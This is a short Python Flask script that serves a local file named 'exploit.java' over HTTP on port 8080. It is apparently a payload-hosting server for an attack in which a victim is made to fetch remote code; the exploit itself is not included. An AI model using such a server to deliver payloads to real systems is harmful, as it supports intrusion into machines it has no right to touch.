from flask import Flask

app = Flask(__name__)

@app.route("/exploit.java")
def exploit():
    return open("exploit.java").read()
 
app.run(port=8080)